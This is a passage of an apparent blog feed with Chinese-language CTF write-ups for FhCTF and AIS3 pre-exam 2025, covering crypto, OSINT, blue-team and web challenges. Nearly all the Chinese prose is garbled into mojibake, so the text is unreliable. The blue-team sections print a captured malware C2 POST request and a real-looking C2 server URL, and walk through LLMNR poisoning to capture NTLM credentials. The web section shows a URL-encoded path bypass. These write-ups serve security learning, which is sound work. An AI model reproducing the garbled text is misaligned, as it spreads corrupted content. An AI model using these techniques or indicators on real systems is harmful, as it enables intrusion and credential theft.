<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*] brute forcing key structures...</span><br><span class="line"></span><br><span class="line">[+] HIT! key=b&#x27;r5K9bB2x&#x27;  scheme=CBC_IV_TheData</span><br><span class="line">[+] head: b&#x27;b4NKr3W8 Encryption Standard (DES) is a symmetric-key block ciph&#x27;</span><br><span class="line">[+] FLAG: b&#x27;FhCTF&#123;23.257735309160896_119.66758643893687&#125;&#x27;</span><br><span class="line">b&#x27;b4NKr3W8 Encryption Standard (DES) is a symmetric-key block cipher that operates on fixed-size blocks of data. DES processes data in 64-bit (8-byte) blocks and uses a 64-bit key, of which 56 bits are effective key material and the remaining 8 bits are used for parity checking. Because DES encrypts only one block at a time, it must be combined with a mode of operation to securely encrypt data longer than a single block.\r\n\r\nOne widely used mode is Cipher Block Chaining (CBC). In DES-CBC mode, each&#x27;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;23.257735309160896_119.66758643893687&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ç®¡ç†å“¡çš„å¯†ç¢¼æ´‹è”¥"><a href="#ç®¡ç†å“¡çš„å¯†ç¢¼æ´‹è”¥" class="headerlink" title="ç®¡ç†å“¡çš„å¯†ç¢¼æ´‹è”¥"></a>ç®¡ç†å“¡çš„å¯†ç¢¼æ´‹è”¥</h3><p>3å€‹level</p>
<ol>
<li>level 1 çµ¦ <code>md5 hash</code>ï¼Œä¸Šç¶²å·¥å…·æŸ¥è§£å¾—åˆ° <code>qwerty</code></li>
<li>level 2 å€‹ <code>SHA-1</code>ï¼Œä½†ç¶“éé€šéˆï¼Œæˆ‘å€‘å¯ä»¥çŒœåˆ° <code>admin</code> é€™å€‹ç­”æ¡ˆ</li>
<li>level 3 æŠŠ <code>base64</code> è½‰æˆæ–‡å­—å°±è¡Œï¼Œå¾—åˆ° <code>FsCTF&#123;Happy Day&#125;</code></li>
</ol>
<p>æœ€å¾Œå°±å¯ä»¥æ‹¿åˆ°flag </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;CrYpt0_W3b_M4st3r_2025&#125;</span><br></pre></td></tr></table></figure>


<h2 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h2><h3 id="Art-Work"><a href="#Art-Work" class="headerlink" title="Art Work"></a>Art Work</h3><p>çµ¦äº†ä¸€å¼µåœ–ç‰‡:<br><img src="/img/FhCTF/35.webp" alt="image"><br>ä»¥åœ–æœåœ–æˆ‘å€‘æœƒç™¼ç¾ä¸€å€‹å«åšã€Œé¢¨ä¹‹ç±½ã€çš„ä½œå“è¢«å±•å‡ºæ–¼111.11.04-112.02.05çš„ã€Œ2022å±æ±è½å±±é¢¨è—è¡“å­£ã€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;å±æ±ç¸£_è½å±±é¢¨è—è¡“å­£_1111104-1120205&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Trace-the-Landmark"><a href="#Trace-the-Landmark" class="headerlink" title="Trace the Landmark"></a>Trace the Landmark</h3><p>çµ¦äº†ä¸‰å¼µåœ–ç‰‡<br><img src="/img/FhCTF/36.webp" alt="photo-1"><br><img src="/img/FhCTF/37.webp" alt="photo-2"><br><img src="/img/FhCTF/38.webp" alt="photo-3"><br>ç”¨ç¬¬ä¸‰å¼µä¾†åœ–ç‰‡æœå°‹æ‰¾åˆ°äº†<strong>Piazza della Rotonda</strong>é€™å€‹å»ºç¯‰<br><img src="/img/FhCTF/39.webp" alt="image"><br>æŒ‰ç…§é¡Œç›®Hintæ’å¥½å¾Œå¾—åˆ°:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;Piazza_della_Rotonda_00186_Roma_RM_Italy&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å³¶1"><a href="#å³¶1" class="headerlink" title="å³¶1"></a>å³¶1</h3><p>çµ¦äº†é€™å¼µåœ–<br><img src="/img/FhCTF/40.webp" alt="land-1"><br>å³ä½¿è¢«æ‰“ç¢¼ï¼Œé‚„æ˜¯å¯ä»¥å¤§è‡´çœ‹å‡ºæ˜¯ã€Œæ–°_å»Ÿå£é¤å»³ã€<br>googleæœå°‹å¾Œ:<br><img src="/img/FhCTF/41.webp" alt="image"><br>æ‰¾åˆ°é¤å»³å¾Œæˆ‘å°±å°è‘—èœå–®å’Œåœ–ä¸­çš„èœä¸€ä¸€çª®èˆ‰<br><img src="/img/FhCTF/42.webp" alt="37077136260_d855810352_c"><br>æœ€å¾Œç­”æ¡ˆæ˜¯åŸåœ–æ­£ä¸­é–“çš„é‚£é“<strong>ç‚’åƒä½›æ‰‹</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;æ–°å¤§å»Ÿå£æ´»æµ·é®®_ç‚’åƒä½›æ‰‹&#125;</span><br></pre></td></tr></table></figure>


<h3 id="The-FH-Gift"><a href="#The-FH-Gift" class="headerlink" title="The FH Gift"></a>The FH Gift</h3><p>ä¸€é–‹å§‹æœƒå‡ºç¾ <code>malware_sample.eml</code> é»é–‹ä¾†æœƒç™¼ç¾:</p>
<p><img src="/img/FhCTF/43.webp" alt="image"></p>
<p>é€™å€‹ salary_adjustment.docx æ–‡ä»¶å¯¦éš›ä¸Šä¸æ˜¯ Word æ–‡ä»¶ï¼Œè€Œæ˜¯ä¸€å€‹å½è£çš„ ZIP å£“ç¸®æª” ã€‚é€šéæª¢æŸ¥æ–‡ä»¶çš„é­”è¡“æ•¸å­—ï¼ˆå‰å¹¾å€‹ bytesï¼‰ï¼Œå¯ä»¥çœ‹åˆ°å®ƒä»¥ PK\x03\x04 é–‹é ­ï¼Œé€™æ˜¯ ZIP æª”æ¡ˆçš„ç‰¹å¾µæ¨™è¨˜ã€‚</p>
<p><img src="/img/FhCTF/44.webp" alt="image"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;M1M3_Typ3s_C4n_B3_D3c3pt1v3&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å·¥å•†æ™‚é–“-1"><a href="#å·¥å•†æ™‚é–“-1" class="headerlink" title="å·¥å•†æ™‚é–“ 1"></a>å·¥å•†æ™‚é–“ 1</h3><p>ä»–çµ¦äº†ä»¥ä¸‹åœ–ç‰‡:<br><img src="/img/FhCTF/45.webp" alt="exhibition"></p>
<p>æŠŠä»–ä¸Ÿåˆ° <a href="https://www.metadata2go.com/">https://www.metadata2go.com/</a> ï¼Œå¯ä»¥å¾—åˆ°ä»¥ä¸‹è³‡æ–™:<br><img src="/img/FhCTF/46.webp" alt="image"></p>
<p>ç„¶å¾Œä»–çš„descriptionæ˜¯ä¸€å€‹ç¶²ç«™<br>é»é€²å»ä»–æœƒè·³å‡ºä¾†ä¸€å€‹å¸¶ä½ åˆ°å±•è¦½ç¶²ç«™çš„ æŒ‰okå°±æœƒè·³éå»</p>
<p><img src="/img/FhCTF/47.webp" alt="2026-01-03_14.35.58"></p>
<p>å¯ä»¥çœ‹åˆ°<a href="https://github.com/tschool-students/tschool-students.github.io">https://github.com/tschool-students/tschool-students.github.io</a></p>
<p>æˆ‘å€‘å¯ä»¥çŸ¥é“æ˜¯ã€Œè‡ºåŒ—å¸‚æ•¸ä½å¯¦é©—é«˜ç´šä¸­ç­‰å­¸æ ¡å­¸ç¿’åˆ†äº«æœƒã€</p>
<p><img src="/img/FhCTF/48.webp" alt="image"></p>
<p>2026.1.18 9:00 - 16:00~1.19 9:00 - 16:00 è½‰æˆ ISO 8601 æ ¼å¼æ˜¯<br><code>2026-01-18T09:00_2026-01-19T16:00</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;T-SCHOOL_STUDENTS_EXPO&#x27;26_2026-01-18T09:00_2026-01-19T16:00&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å·¥å•†æ™‚é–“-2"><a href="#å·¥å•†æ™‚é–“-2" class="headerlink" title="å·¥å•†æ™‚é–“ 2"></a>å·¥å•†æ™‚é–“ 2</h3><p>ç”± <code>å·¥å•†æ™‚é–“ 1</code>ï¼Œæˆ‘å€‘å¯ä»¥å¾æ´»å‹•å®˜ç¶²å¾—çŸ¥æ´»å‹•åœ°é»åœ¨ <code>è‡ºåŒ—å¸‚ä¸­å±±å€å‰æ—è·¯110è™Ÿ</code></p>
<p>æˆ‘å€‘æŠŠåœ°å€ä¸Ÿåˆ°Google Mapsæ”¶å°‹ï¼Œä¸¦è¤‡è£½åº§æ¨™è²¼ä¸Šä¾†:</p>
<p><img src="/img/FhCTF/49.webp" alt="æˆªåœ– 2026-01-05 00.25.06"></p>
<h3 id="Lithium-exploration"><a href="#Lithium-exploration" class="headerlink" title="Lithium exploration"></a>Lithium exploration</h3><p><img src="/img/FhCTF/50.webp" alt="SalardeUyuni"></p>
<p>ä¸Ÿçµ¦AI</p>
<p>åœ‹å®¶ï¼š ç»åˆ©ç¶­äº (Bolivia)<br>æ¹–æ³Šåç¨±ï¼ˆé¹½æ²¼ï¼‰ï¼š çƒå°¤å°¼é¹½æ²¼ (Salar de Uyuni)<br>ç”Ÿç”¢ç¤¦ç‰©ï¼š é‹° (Lithium)</p>
<p>åŸæœ¬æ˜¯éŒ¯çš„<br>ä½†å¾Œä¾†æ”¹é¡Œç›®å¾Œå°±å°äº†ï¼Œå¾ˆå¥‡å¦™</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;Bolivia_SalardeUyuni_Lithium&#125;</span><br></pre></td></tr></table></figure>

<h3 id="SRL"><a href="#SRL" class="headerlink" title="SRL"></a>SRL</h3><p>çµ¦äº†ä»¥ä¸‹åœ–ç‰‡<br><img src="/img/FhCTF/51.webp" alt="SRL"><br>æˆ‘å€‘å¯ä»¥çœ‹åˆ°å³æ–¹æ˜¯å¤§å·¨è›‹å¾Œæ™¯æœ‰åœ‹çˆ¶ç´€å¿µé¤¨å’Œå°åŒ—101<br>æ‰€ä»¥æˆ‘å€‘å¯ä»¥æ¨æ–·æˆ‘å€‘åœ¨:<br><img src="/img/FhCTF/52.webp" alt="image"></p>
<h3 id="å³¶2"><a href="#å³¶2" class="headerlink" title="å³¶2"></a>å³¶2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åœ¨æ¸…æœ«æ°‘åˆå¹´ä»£ï¼Œäººå€‘å°éº»ç˜‹ç—…ï¼ˆç—²ç˜‹ç—…ï¼‰æ‰€çŸ¥æœ‰é™ï¼Œç‚ºäº†é˜»çµ•å¾—ç—…çš„æ‚£è€…ï¼Œå°±æŠŠä»–å€‘é€åˆ°å»ºåŠŸå¶¼ä¸Šè‡ªç”Ÿè‡ªæ»…ï¼Œå› æ­¤é€™åº§å³¶è¢«ç¨±ç‚ºã€Œç—²ç˜‹ç¤ã€ã€‚æ‚£è€…è¢«éš”é›¢åœ¨å³¶ä¸Šå¾Œï¼Œåªèƒ½é™æœ›é‡‘é–€æœ¬å³¶ï¼Œç„¡æ³•å›å®¶ã€‚</span><br></pre></td></tr></table></figure>
<p>by google AI æœå°‹<br><img src="/img/FhCTF/53.webp" alt="image"><br><img src="/img/FhCTF/54.webp" alt="image"></p>
<h3 id="æ¼‚äº®çš„åœ“é ‚-1"><a href="#æ¼‚äº®çš„åœ“é ‚-1" class="headerlink" title="æ¼‚äº®çš„åœ“é ‚ 1"></a>æ¼‚äº®çš„åœ“é ‚ 1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è«‹é€šéˆ</span><br></pre></td></tr></table></figure>

<p><img src="/img/FhCTF/55.webp" alt="image"></p>
<h3 id="æ¼‚äº®çš„åœ“é ‚-2"><a href="#æ¼‚äº®çš„åœ“é ‚-2" class="headerlink" title="æ¼‚äº®çš„åœ“é ‚ 2"></a>æ¼‚äº®çš„åœ“é ‚ 2</h3><p>ç°¡å–®æœå°‹ <code>å…è²»èˆ¹ç­ åœŸè€³å…¶</code>ï¼Œå¯ä»¥è®“æˆ‘å€‘æ‰¾åˆ°åœŸè€³å…¶èˆªç©ºçš„é€™å€‹é é¢:</p>
<p><a href="https://www.turkishairlines.com/zh-tw/flights/fly-different/touristanbul/">https://www.turkishairlines.com/zh-tw/flights/fly-different/touristanbul/</a></p>
<p><img src="/img/FhCTF/56.webp" alt="æˆªåœ– 2026-01-05 00.40.35"></p>
<p>çœ‹Google Mapsï¼Œå¯ä»¥ç™¼ç¾æˆ‘å€‘çš„ç›®çš„åœ°ï¼Œå°±æ­£è™•æ–¼åšæ–¯æ™®é²æ–¯æµ·å³½é™„è¿‘ï¼Œæˆ‘å€‘å¯ä»¥é©—è­‰é€™æ˜¯å°çš„æ–¹å‘ã€‚</p>
<p>æˆ‘å€‘æœ‰äº†é€™äº›è³‡è¨Š <code>T06 18:30-23:00 åšæ–¯æ™®é­¯æ–¯æµ·å³½ä¹‹æ—…ï¼ˆ4 æœˆ 1 æ—¥è‡³ 10 æœˆ 31 æ—¥æœŸé–“ç‡Ÿé‹ï¼‰</code></p>
<p>é€šéˆä¸€ä¸‹æ ¼å¼è®Šæˆ flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;1830-2300_0401-1031&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æ²’æˆ´å®‰å…¨å¸½çš„é¨å£«"><a href="#æ²’æˆ´å®‰å…¨å¸½çš„é¨å£«" class="headerlink" title="æ²’æˆ´å®‰å…¨å¸½çš„é¨å£«"></a>æ²’æˆ´å®‰å…¨å¸½çš„é¨å£«</h3><p><img src="/img/FhCTF/57.webp" alt="rider_without_helmet"></p>
<p>ä¸Šç¶²ç°¡å–®åœ–ç‰‡æŸ¥è³‡æ–™ï¼Œå¯çŸ¥å» ç‰Œã€è»Šå‹ï¼Œæ¯å€‹è©¦ä¸€ä¸‹ï¼Œå°±èƒ½é–å®šä¸‹ç­”æ¡ˆã€‚<br><img src="/img/FhCTF/58.webp" alt="image"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;2014_Kymco_Many50&#125;</span><br></pre></td></tr></table></figure>


<h3 id="EXIFçš„ã€Œæ‹æ”åº§æ¨™ã€"><a href="#EXIFçš„ã€Œæ‹æ”åº§æ¨™ã€" class="headerlink" title="EXIFçš„ã€Œæ‹æ”åº§æ¨™ã€"></a>EXIFçš„ã€Œæ‹æ”åº§æ¨™ã€</h3><p>é€™é¡Œçµ¦çš„æª”æ¡ˆå‡ºäº†é»å°å•é¡Œï¼Œä½†å°±æ˜¯ exif å®Œçµ„åˆä¸€ä¸‹ç…§ç‰‡çš„ç¶“ç·¯åº¦é€šéˆä¸€ä¸‹å°±å¥½äº†ã€‚</p>
<h2 id="Blue-team"><a href="#Blue-team" class="headerlink" title="Blue team"></a>Blue team</h2><h3 id="å¤§è¨‚å–®"><a href="#å¤§è¨‚å–®" class="headerlink" title="å¤§è¨‚å–®"></a>å¤§è¨‚å–®</h3><ol>
<li>ä¸€çµ„åŠ å¯†çš„åå…­é€²åˆ¶å­—ä¸²: <code>775a20657e725a206725250925317172587b3774750d2132747f5a2631752251</code></li>
<li>ç¶²è·¯å°åŒ…çš„ hex dump,é¡¯ç¤º HTTP POST è«‹æ±‚</li>
</ol>
<p>æª¢æŸ¥æä¾›çš„å°åŒ…å…§å®¹,å¯ä»¥è§€å¯Ÿåˆ°ä»¥ä¸‹é—œéµè³‡è¨Š:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/v1/config HTTP/1.1</span><br><span class="line">Host: 45.33.22.11</span><br><span class="line">User-Agent: C2-Client/1.0</span><br><span class="line">X-Auth-Token: FhCTF</span><br><span class="line">Content-Type: application/x-binary</span><br><span class="line"></span><br><span class="line">Target_ID: 775a20657e725a206725250925317172587b3774750d2132747f5a2631752251</span><br></pre></td></tr></table></figure>
<p>å¾å°åŒ…ä¸­çš„ <code>X-Auth-Token: FhCTF</code> æ¬„ä½,å¯ä»¥æ¨æ¸¬ <code>FhCTF</code> å¾ˆå¯èƒ½å°±æ˜¯ç”¨æ–¼åŠ å¯† Target_ID çš„é‡‘é‘°ã€‚</p>
<ul>
<li>ä½¿ç”¨ Python å°åå…­é€²åˆ¶å­—ä¸²é€²è¡Œ XOR è§£å¯†:</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">hex_string = <span class="string">&quot;775a20657e725a206725250925317172587b3774750d2132747f5a2631752251&quot;</span></span><br><span class="line">key = <span class="string">&quot;FhCTF&quot;</span></span><br><span class="line"></span><br><span class="line">hex_bytes = <span class="built_in">bytes</span>.fromhex(hex_string)</span><br><span class="line">result = <span class="built_in">bytearray</span>()</span><br><span class="line">key_bytes = key.encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(hex_bytes):</span><br><span class="line">    result.append(byte ^ key_bytes[i % <span class="built_in">len</span>(key_bytes)])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result.decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å°‡è§£å¯†å¾—åˆ°çš„ MD5 hash <code>12c1842c3ccafe7408c23ebf292ee3d9</code> æäº¤åˆ° VirusTotal é€²è¡ŒæŸ¥è©¢ã€‚<br><img src="/img/FhCTF/59.webp" alt="image"><br>åœ¨ VirusTotal çš„åˆ†æå ±å‘Šä¸­,å¯ä»¥æ‰¾åˆ°è©²æƒ¡æ„è»Ÿé«”çš„ C2 é€šè¨Šç›®æ¨™:</p>
<ul>
<li><strong>C2 ä¼ºæœå™¨</strong>: <code>http://171.22.28.221/5c06c05b7b34e8e6.php</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;http://171.22.28.221/5c06c05b7b34e8e6.php&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ğŸ§©-Userâ€™s-Bad-Day"><a href="#ğŸ§©-Userâ€™s-Bad-Day" class="headerlink" title="ğŸ§© Userâ€™s Bad Day"></a>ğŸ§© Userâ€™s Bad Day</h3><p>çµ¦å‡ºçš„ç·šç´¢æ˜¯ä¸€æ®µå°åŒ…ç´€éŒ„ï¼Œè¦æ±‚å¾ä¸­æ‰¾å‡ºä¸‰å€‹é—œéµè³‡è¨Šï¼šä¸»æ©Ÿåç¨±ã€å¸³è™Ÿåç¨±èˆ‡æª”æ¡ˆåç¨±ï¼Œæœ€å¾Œä¾æŒ‡å®šæ ¼å¼çµ„æˆ Flagã€‚</p>
<ul>
<li><p>DNS æŸ¥è©¢ä¸­çš„ä¸»æ©Ÿåç¨±</p>
<p>  åœ¨å°åŒ…æœ€å‰é¢å¯ä»¥çœ‹åˆ°ä¸€å€‹ DNS å°åŒ…ï¼Œå…§å®¹é¡ä¼¼ï¼š</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">DNS Standard query A fulesrv.local</span><br></pre></td></tr></table></figure>

<p>  é€™ä»£è¡¨ä½¿ç”¨è€…åŸæœ¬æƒ³é€£ç·šçš„ä¸»æ©Ÿæ˜¯ <code>fulesrv.local</code>ã€‚<br>  é¡Œç›®æç¤ºã€Œä¸»æ©Ÿåç¨±ä¸å« domainã€ï¼Œå› æ­¤åªå–å‰åŠæ®µï¼š</p>
<ul>
<li>ä¸»æ©Ÿåç¨±ï¼ˆä¸å« domainï¼‰ï¼š<code>fulesrv</code></li>
</ul>
<p>  âœ… ä¸»æ©Ÿåç¨± &#x3D; <code>fulesrv</code></p>
</li>
<li><p>DNS å¤±æ•—èˆ‡ LLMNR å•Ÿç”¨</p>
<p>  ç•¶ DNS æŸ¥è©¢å¤±æ•—æ™‚ï¼ŒWindows æœƒå˜—è©¦ä½¿ç”¨ LLMNRï¼ˆLink-Local Multicast Name Resolutionï¼‰ä¾†è§£æåŒä¸€å€‹åç¨±ã€‚<br>  å°åŒ…ä¸­å¯çœ‹åˆ°é¡ä¼¼ï¼š</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">LLMNR query A fulesrv</span><br></pre></td></tr></table></figure>

<p>  é€™è¡¨ç¤ºç³»çµ±æ”¹ç”¨ LLMNR ç™¼é€åç¨±æŸ¥è©¢ï¼Œè©¢å•ã€Œèª°æ˜¯ fulesrvï¼Ÿã€</p>
</li>
<li><p>LLMNR Poisoningã€Œæ€ªäº‹ã€çš„ä¾†æº</p>
<p>  åœ¨é€™å€‹éšæ®µï¼Œæ”»æ“Šè€…ä¸»æ©Ÿï¼ˆä¾‹å¦‚ IPï¼š<code>192.168.50.200</code>ï¼‰å½è£æˆ fulesrv å›æ‡‰é€™å€‹ LLMNR æŸ¥è©¢ï¼Œè²ç¨±è‡ªå·±å°±æ˜¯ç›®æ¨™ä¼ºæœå™¨ã€‚<br>  çµæœï¼š</p>
<ul>
<li>ä½¿ç”¨è€…èª¤ä»¥ç‚ºè§£ææˆåŠŸï¼Œå¯¦éš›ä¸Šé€£åˆ°çš„æ˜¯æ”»æ“Šè€…ä¸»æ©Ÿã€‚</li>
<li>ä¹‹å¾Œä¾¿æœƒå°æ”»æ“Šè€…çš„ IP å»ºç«‹ SMB é€£ç·šï¼ˆTCP 445ï¼‰ï¼Œä¸¦é€å‡ºé©—è­‰è³‡è¨Šã€‚</li>
</ul>
<p>  é€™å°±æ˜¯å…¸å‹çš„ <strong>LLMNR Poisoning</strong> æ”»æ“Šæµç¨‹ï¼Œä¹Ÿæ˜¯é¡Œç›®ã€ŒUserâ€™s Bad Dayã€åç¨±çš„ç”±ä¾†ã€‚</p>
</li>
<li><p>å¸³è™Ÿåç¨±ï¼šå¾ NTLM é©—è­‰ä¸­å–å¾—ä½¿ç”¨è€…å¸³è™Ÿ</p>
<p>  ç•¶ä½¿ç”¨è€…é€é SMB é€£å‘å‡å†’çš„ä¼ºæœå™¨æ™‚ï¼Œæœƒé€²è¡Œ NTLM é©—è­‰æµç¨‹ï¼Œå…¶ä¸­æœƒåŒ…å« <code>NTLMSSP AUTHENTICATE_MESSAGE</code> å°åŒ…ã€‚<br>  åœ¨é€™é¡å°åŒ…ä¸­ï¼Œé€šå¸¸å¯è§£æå‡ºï¼š</p>
<ul>
<li>Domain Name  </li>
<li>User Name  </li>
<li>Workstation Name</li>
</ul>
<p>  å°‡å°åŒ…ä¸­çš„ Unicodeï¼ˆUTF-16LEï¼‰å­—ä¸²è§£ç¢¼å¾Œï¼Œå¯ä»¥å¾—åˆ°ï¼š</p>
<ul>
<li>Domain Nameï¼š<code>DOMAIN</code>  </li>
<li>User Nameï¼š<code>Bob</code>  </li>
<li>Workstationï¼š<code>WORKST</code></li>
</ul>
<p>  é¡Œç›®å•çš„æ˜¯ã€Œæ”»æ“Šè€…æ””æˆªåˆ°çš„å¸³è™Ÿåç¨±ã€ï¼Œä¹Ÿå°±æ˜¯ NTLM é©—è­‰è£¡çš„ä½¿ç”¨è€…åç¨±ï¼š</p>
<p>  âœ… å¸³è™Ÿåç¨± &#x3D; <code>Bob</code></p>
</li>
<li><p>æª”æ¡ˆåç¨±ï¼šå¾ SMB å°åŒ…ä¸­çš„å­—ä¸²é‚„åŸ</p>
<p>  åœ¨å¾ŒçºŒ SMB å°åŒ…ä¸­ï¼Œæœƒå‡ºç¾ä½¿ç”¨è€…å˜—è©¦å­˜å–çš„æª”æ¡ˆè·¯å¾‘æˆ–æª”æ¡ˆåç¨±ã€‚é¡Œç›®æç¤ºè¦æ³¨æ„ UTF-16LE ç·¨ç¢¼ï¼Œå› æ­¤ç”¨åå…­é€²åˆ¶è§€çœ‹å°åŒ…å…§å®¹æ™‚å¯ä»¥çœ‹åˆ°é¡ä¼¼ï¼š</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">74 00 65 00 73 00 74 00</span><br></pre></td></tr></table></figure>

<p>  å°‡é€™ä¸² bytes ä»¥ UTF-16LE è§£ç¢¼ï¼š</p>
<ul>
<li><code>74 00</code> â†’ <code>&#39;t&#39;</code>  </li>
<li><code>65 00</code> â†’ <code>&#39;e&#39;</code>  </li>
<li><code>73 00</code> â†’ <code>&#39;s&#39;</code>  </li>
<li><code>74 00</code> â†’ <code>&#39;t&#39;</code></li>
</ul>
<p>  åˆèµ·ä¾†å°±æ˜¯ï¼š</p>
<ul>
<li><code>test</code></li>
</ul>
<p>  é¡Œç›®åŒæ™‚å¼·èª¿ã€Œæª”æ¡ˆåç¨±ä¸å«å‰¯æª”åã€ï¼Œæ‰€ä»¥å³ä¾¿å¯¦éš›æª”æ¡ˆå¯èƒ½æ˜¯ <code>test.txt</code>ã€<code>test.docx</code> ç­‰ï¼Œåœ¨ Flag ä¸­åªéœ€è¦æª”åæœ¬é«”ï¼š</p>
<p>  âœ… æª”æ¡ˆåç¨± &#x3D; <code>test</code></p>
<p>  ä¾é¡Œç›®æŒ‡å®šæ ¼å¼ï¼š</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;ä¸»æ©Ÿåç¨±_å¸³è™Ÿä»£è™Ÿ_æª”æ¡ˆåç¨±&#125;</span><br></pre></td></tr></table></figure>

<p>  å°‡å‰é¢ä¸‰å€‹å·²ç¢ºèªçš„ç­”æ¡ˆä¾åºä»£å…¥ï¼š</p>
<ul>
<li>ä¸»æ©Ÿåç¨±ï¼š<code>fulesrv</code>  </li>
<li>å¸³è™Ÿä»£è™Ÿï¼ˆå¸³è™Ÿåç¨±ï¼‰ï¼š<code>Bob</code>  </li>
<li>æª”æ¡ˆåç¨±ï¼š<code>test</code></li>
</ul>
<p>  å¾—åˆ°æœ€çµ‚ Flagï¼š</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;fulesrv_Bob_test&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>æŠ€è¡“åˆ†äº«</category>
      </categories>
      <tags>
        <tag>è³‡å®‰</tag>
      </tags>
  </entry>
  <entry>
    <title>AIS3 pre-exam 2025</title>
    <url>/2025/07/11/ais3preexam/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>é€™æ˜¯æˆ‘çš„ç¬¬ä¸€æ¬¡CTF<br>æ‰“å¾—å¾ˆçˆ›writeupä¹Ÿå¯«å¾—å¾ˆçˆ›<br><del>ç‚ºäº†å„ä½çš„çœ¼ç›è‘—æƒ³è«‹ä¸è¦ç¹¼çºŒå¾€ä¸‹çœ‹</del></p>
<span id="more"></span>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="tomorin-db"><a href="#tomorin-db" class="headerlink" title="tomorin db"></a>tomorin db</h2><h3 id="é¡Œç›®è§€å¯Ÿ"><a href="#é¡Œç›®è§€å¯Ÿ" class="headerlink" title="é¡Œç›®è§€å¯Ÿ"></a>é¡Œç›®è§€å¯Ÿ</h3><p>é¦–å…ˆé»é€²é¡Œç›®æä¾›çš„ç¶²å€ <a href="http://chals1.ais3.org:30000/">http://chals1.ais3.org:30000/</a> :<br><img src="/img/ais3/tomorin.webp"><br>å¯ä»¥çœ‹åˆ°å…¶ä¸­æœ‰å››å€‹æª”æ¡ˆ</p>
<ul>
<li>cute.jpg</li>
<li>flag</li>
<li>is.jpg</li>
<li>tomorin.jpg</li>
</ul>
<p>å…¶ä¸­ä¸‰å€‹æ˜¯åœ–ç‰‡,<strong>ä½†flagé»é€²å»æœƒè·³è½‰åˆ°<a href="https://www.youtube.com/watch?v=lQuWN0biOBU">MyGO!!!!!çš„è¿æ—¥ç®‹ç§‹</a></strong> <del>åˆåœ¨GO</del><br><img src="/img/ais3/MyGO.webp"></p>
<h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>æ—¢ç„¶flagæ–‡ä»¶ç¢ºå¯¦å­˜åœ¨,ä½†æ˜¯&#x2F;flagè·¯å¾‘åšäº†ç‰¹æ®Šè™•ç†,é‚£æˆ‘å€‘å¯ä»¥å˜—è©¦ç¹é&#x2F;flagé€™å€‹è·¯å¾‘</p>
<h3 id="ç¹éæ€è·¯"><a href="#ç¹éæ€è·¯" class="headerlink" title="ç¹éæ€è·¯"></a>ç¹éæ€è·¯</h3><p>ç¶“éå˜—è©¦,æˆ‘ç™¼ç¾å¦‚æœæˆ‘å€‘ç”¨URLç·¨ç¢¼ <strong>(%2f)</strong> å†åŠ ä¸Šflagå°±ä¸æœƒè¢«è½‰å€<br>æ‰€ä»¥æˆ‘åœ¨æ ¹ç¶²å€å¾ŒåŠ ä¸Š <em><strong>&#x2F;%2fflag</strong></em><br><img src="/img/ais3/%E6%88%90%E5%8A%9F%E8%A8%AA%E5%95%8F.webp"></p>
<p>æˆ‘å€‘å°±å¯ä»¥å¾—åˆ°flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AIS3&#123;G01ang_H2v3_a_c0O1_way!!!_Us3ing_C0NN3ct_M3Th07_L0l@T0m0r1n_1s_cute_D0_yo7_L0ve_t0MoRIN?&#125; </span><br></pre></td></tr></table></figure>
